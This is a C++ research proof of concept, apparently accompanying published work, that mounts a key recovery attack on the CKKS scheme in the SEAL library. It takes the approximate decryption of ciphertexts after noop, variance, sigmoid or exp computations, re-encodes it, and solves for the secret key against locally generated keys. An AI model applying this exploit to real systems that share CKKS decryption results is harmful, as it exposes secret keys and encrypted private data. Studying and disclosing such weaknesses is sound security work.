// Key recovery attack against the SEAL implementation of CKKS
#include "seal/seal.h"
#include "seal/util/polyarithsmallmod.h"

#include <iostream>
#include <vector>
#include <numeric>

#include "seal_utils.h"
#include "eval.h"

using namespace seal;


void evalVariance(Ciphertext & ctRes, Ciphertext const& ct, CKKSEncoder & encoder,
                  Evaluator & evaluator, RelinKeys const& relin_keys, GaloisKeys const& gal_keys,
                  uint32_t logBatchSize, double scale) {
   std::cout << "evalVariance size = " << (1<<logBatchSize) << std::endl;
   evaluator.square(ct, ctRes); // x^2
   evaluator.relinearize_inplace(ctRes, relin_keys);
   evaluator.rescale_to_next_inplace(ctRes);
   for (uint32_t i = 1; i <= logBatchSize; i++) {
      int shift = 1 << (logBatchSize - i);
      Ciphertext tmp;
      evaluator.rotate_vector(ctRes, -shift, gal_keys, tmp);
      evaluator.add_inplace(ctRes, tmp);
   }
   double factor = 1.0/((double)(1 << logBatchSize));
   Plaintext plain_factor;
   encoder.encode(factor, ctRes.parms_id(), scale, plain_factor);
   evaluator.multiply_plain_inplace(ctRes, plain_factor);
   evaluator.rescale_to_next_inplace(ctRes);
   // ctRes.scale() *= factor;
   std::cout << "final scale = " << log2(ctRes.scale()) << std::endl;
}

// ctRes[i] = encryption of x^(2^i), where ct = encryption of x, for 0 <= i <= logDeg
void evalPowerOf2(std::vector<Ciphertext> & ctRes, Ciphertext const& ct, int logDeg,
                  Evaluator & evaluator, RelinKeys const& relin_keys) {
   ctRes.resize(logDeg+1);
   ctRes[0] = ct;                             // x^(2^0)
   for (int i = 1; i <= logDeg; i++) {
      evaluator.square(ctRes[i-1], ctRes[i]); // x^(2^i)
      evaluator.relinearize_inplace(ctRes[i], relin_keys);
      evaluator.rescale_to_next_inplace(ctRes[i]); // mod (q0 .. q{-i})
   }
}

// Assume ct = Enc(x), coeff represents a polynomial sum( coeff[i] * x^i )
void evalFunction(Ciphertext & ctRes, Ciphertext const& ct, std::vector<double> coeff,
                  std::shared_ptr<SEALContext> context, CKKSEncoder & encoder, Evaluator & evaluator,
                  RelinKeys const& relin_keys, double scale, int evalDeg = -1) {
   int deg = evalDeg == -1 ? coeff.size()-1 : std::min((size_t)evalDeg, coeff.size() - 1); // assume coeff is not empty
   int logDeg = std::floor(std::log2((double)deg));
   std::cout << "evalFunction " << coeff << " to degree " << deg << std::endl;
   std::vector<Ciphertext> ctPow2s(logDeg+1);
   evalPowerOf2(ctPow2s, ct, logDeg, evaluator, relin_keys);
   ctRes = ct;
   
   std::vector<Plaintext> plain_coeff(deg+1);
   encoder.encode(coeff[1], ct.parms_id(), scale, plain_coeff[1]);
   evaluator.multiply_plain_inplace(ctRes, plain_coeff[1]);  // c_1 * x
   evaluator.rescale_to_next_inplace(ctRes);

   encoder.encode(coeff[0], ctRes.parms_id(), ctRes.scale(), plain_coeff[0]); // scale as ctRes
   evaluator.add_plain_inplace(ctRes, plain_coeff[0]);       // c_1 * x + c_0
   for (int i = 2; i <= deg; i++) {
      if (fabs(coeff[i]) < 1e-27) {
         continue;                        // Too small, skip this term
      }
      int k = std::floor(std::log2((double)i));
      int r = i - (1 << k);               // i = 2^k + r
      Ciphertext tmp = ctPow2s[k];        // x^(2^k)
      while (r > 0) {
         k = std::floor(std::log2((double)r));
         r = r - (1 << k);

         Ciphertext ctPow2k = ctPow2s[k];
         evaluator.mod_switch_to_inplace(ctPow2k, tmp.parms_id()); // ctPow2s[k] is in a higher level
         evaluator.multiply_inplace(tmp, ctPow2k);
         evaluator.relinearize_inplace(tmp, relin_keys);
         evaluator.rescale_to_next_inplace(tmp);
      }

      encoder.encode(coeff[i], tmp.parms_id(), tmp.scale(), plain_coeff[i]); // scale as ctRes
      evaluator.multiply_plain_inplace(tmp, plain_coeff[i]); // c_i * x^i
      evaluator.rescale_to_next_inplace(tmp);

      auto res_context_data = context->get_context_data(ctRes.parms_id());
      auto tmp_context_data = context->get_context_data(tmp.parms_id());
      if (res_context_data->chain_index() < tmp_context_data->chain_index()) {
         evaluator.mod_switch_to_inplace(tmp, ctRes.parms_id());
      } else {
         evaluator.mod_switch_to_inplace(ctRes, tmp.parms_id());
      }
      double new_scale = pow(2.0, round(log2(tmp.scale())));
      tmp.scale() = new_scale;   // round the scaling factor to the nearest power of 2
      ctRes.scale() = new_scale; // round the scaling factor to the nextest power of 2
      evaluator.add_inplace(ctRes, tmp);  // Now they can be added together
   }
}



int attack(uint32_t logN = 15,      // Ring size
           uint32_t scaleBits = 40, // bit-length of the scaling factor
           double plainBound = 1.0, // bound on the plaintext numbers
           int32_t evalDeg = -1,    // degree to evaluate, default to all
           HomomorphicComputation hc = HC_NOOP // the circuit to compute homomorphically
           ) {
   EncryptionParameters parms(scheme_type::CKKS);   // Set the parameters for CKKS
   size_t poly_modulus_degree = 1<<logN;
   parms.set_poly_modulus_degree(poly_modulus_degree);

   int maxQBits = logN == 16 ? 350 : CoeffModulus::MaxBitCount(poly_modulus_degree, sec_level_type::tc256);
   std::vector<int> modulusBits = { 60 }; // Set the first prime to be 60-bit
   int totalQBits = 60;
   while (totalQBits <= maxQBits-60) {    // reserve the last special prime (60-bit)
      modulusBits.push_back(scaleBits);   // add a prime modulus of size == scaleBits
      totalQBits += scaleBits;
   }
   modulusBits.push_back(60);             // add the special prime modulus
   parms.set_coeff_modulus(CoeffModulus::Create(
        poly_modulus_degree, modulusBits));
   auto context = SEALContext::Create(parms, true, sec_level_type::none);
   print_parameters(context);

   // Generate keys
   KeyGenerator keygen(context);
   PublicKey public_key = keygen.public_key();
   SecretKey secret_key = keygen.secret_key();
   RelinKeys relin_keys = keygen.relin_keys_local();
   GaloisKeys gal_keys;

   if (hc == HC_VARIANCE) {
      // Generate rotation keys for variance computation
      std::vector<int> rotIndexSet(logN-1);
      for (int32_t i = 0; i < logN-1; i++) {
         rotIndexSet[i] = -(1 << i);
      }
      gal_keys = keygen.galois_keys_local(rotIndexSet);
   }

   Encryptor encryptor(context, public_key);
   Evaluator evaluator(context);
   Decryptor decryptor(context, secret_key);
   CKKSEncoder encoder(context);
   size_t slot_count = encoder.slot_count();  // Let's use all the available slots

   // First we generate some random numbers
   std::vector<cx_double> val_input(slot_count);
   randomComplexVector(val_input, slot_count, plainBound);

   // Set the initial scale
   double scale = pow(2.0, scaleBits);

   // Encode plaintext numbers into a polynomial
   Plaintext ptxt_input;
   encoder.encode(val_input, scale, ptxt_input);
   Ciphertext ctxt_input;
   encryptor.encrypt(ptxt_input, ctxt_input);

   // Homomorphic computation
   Ciphertext ctxt_res;
   std::vector<double> coeff(11);
   switch (hc) {
   case HC_VARIANCE :
      evalVariance(ctxt_res, ctxt_input, encoder, evaluator, relin_keys, gal_keys, log2(slot_count), scale);
      break;
   case HC_SIGMOID :
      coeff = SpecialFunction::coeffsOf[SpecialFunction::FuncName::SIGMOID];
      evalFunction(ctxt_res, ctxt_input, coeff, context, encoder, evaluator, relin_keys, scale, evalDeg);
      break;
   case HC_EXP :
      coeff = SpecialFunction::coeffsOf[SpecialFunction::FuncName::EXP];
      evalFunction(ctxt_res, ctxt_input, coeff, context, encoder, evaluator, relin_keys, scale, evalDeg);
      break;
   default :
      ctxt_res = ctxt_input;    // noop, just copy the input ciphertext
   }
   // Now let's do approximate decryption and then recover the key
   Plaintext ptxt_res;
   decryptor.decrypt(ctxt_res, ptxt_res); // approx decryption

   // Decode the plaintext polynomial
   std::vector<std::complex<double>> val_res;
   encoder.decode(ptxt_res, val_res);    // decode to an array of complex

   // Check computation errors
   std::vector<std::complex<double>> pt_res(slot_count);
   switch (hc) {
   case HC_VARIANCE :
      evalPlainVariance(pt_res, val_input);
      break;
   case HC_SIGMOID :
      evalPlainFunc(pt_res, val_input, SpecialFunction::SIGMOID, evalDeg);
      break;
   case HC_EXP :
      evalPlainFunc(pt_res, val_input, SpecialFunction::EXP, evalDeg);
      break;
   default :
      pt_res = val_input;      // noop, just copy the plaintext input
   }
   std::cout << "computation error = " << maxDiff(pt_res, val_res)
             << ", relative error = " << relError(pt_res, val_res) << std::endl;

   // **************************************************
   // Key recovery attack
   // **************************************************

   // First we encode the decrypted floating point numbers into polynomials
   Plaintext ptxt_enc;
   encoder.encode(val_res, ctxt_res.parms_id(), ctxt_res.scale(), ptxt_enc);

   // Then we get some impl parameters used in the scheme
   auto context_data = context->get_context_data(ctxt_res.parms_id());
   auto small_ntt_tables = context_data->small_ntt_tables();
   auto &ciphertext_parms = context_data->parms();
   auto &coeff_modulus = ciphertext_parms.coeff_modulus();
   size_t coeff_mod_count = coeff_modulus.size();
   size_t coeff_count = ciphertext_parms.poly_modulus_degree();

   // Check encoding error
   Plaintext ptxt_diff;
   ptxt_diff.parms_id() = parms_id_zero;
   ptxt_diff.resize(util::mul_safe(coeff_count, coeff_modulus.size()));
   sub_dcrtpoly(ptxt_enc.data(), ptxt_res.data(), coeff_count, coeff_modulus, ptxt_diff.data());

   to_coeff_rep(ptxt_diff.data(), coeff_count, coeff_mod_count, small_ntt_tables);
   long double err_norm = infty_norm(ptxt_diff.data(), context_data.get());
   std::cout << "encoding error = " << err_norm << std::endl;

   // Now let's compute the secret key
   MemoryPoolHandle pool = MemoryManager::GetPool();
   std::cout << "key recovery ..." << std::endl;

   // rhs = ptxt_enc - ciphertext.b
   auto rhs(util::allocate_zero_poly(poly_modulus_degree, coeff_mod_count, pool));
   sub_dcrtpoly(ptxt_enc.data(), ctxt_res.data(0), coeff_count, coeff_modulus, rhs.get());
   
   auto ca(util::allocate_zero_poly(poly_modulus_degree, coeff_mod_count, pool));
   assign_dcrtpoly(ctxt_res.data(1), coeff_count, coeff_modulus.size(), ca.get());

   std::cout << "compute ca^{-1} ..." << std::endl;
   auto ca_inv(util::allocate_zero_poly(poly_modulus_degree, coeff_mod_count, pool));

   bool has_inv = inv_dcrtpoly(ca.get(), coeff_count, coeff_modulus, ca_inv.get());
   if(!has_inv) {
      throw std::logic_error("ciphertext[1] has no inverse");
   }

   // The recovered secret: key_guess = ciphertext.a^{-1} * rhs
   std::cout << "compute (m' - cb) * ca^{-1} ..." << std::endl;
   auto key_guess(util::allocate_zero_poly(poly_modulus_degree, coeff_mod_count, pool));
   mul_dcrtpoly(rhs.get(), ca_inv.get(), coeff_count, coeff_modulus, key_guess.get());

   bool is_found = util::is_equal_uint(key_guess.get(),
                                       secret_key.data().data(),
                                       coeff_count * coeff_mod_count);

   // In retrospect, let's see how big the re-encoded polynomial is
   to_coeff_rep(ptxt_enc.data(), coeff_count, coeff_mod_count, small_ntt_tables);
   std::cout << "m' norm bits = " << log2(l2_norm(ptxt_enc.data(), context_data.get())) << std::endl;

   return is_found;             // All done
}

int main(int argc, char * argv[]) {
   int iter = 1;
   if (argc == 2) {
      iter = atoi(argv[1]);
   }
   HomomorphicComputation hc = argc>2 ? parseHC(argv[2]) : HC_NOOP;
   uint32_t logN = argc > 3 ? atoi(argv[3]) : 15;      // ring size
   uint32_t scaleBits = argc > 4 ? atoi(argv[4]) : 40; // bit-length of scale
   double plainBound = argc > 5 ? atof(argv[5]) : 1.0; // upper bound on plaintext numbers
   int32_t evalDeg = argc > 6 ? atoi(argv[6]) : -1;    // degree to evaluate, default to all
   
   int success = 0;
   for (int i = 0; i<iter; i++) {
      if (attack(logN, scaleBits, plainBound, evalDeg, hc)) {
         std::cout << "Found key!" << std::endl;
         success++;
      }
      else std::cout << "Attack failed!" << std::endl;
   }
   std::cout << "Attack worked " << success << " times out of " << iter << std::endl;
   return 0;
}

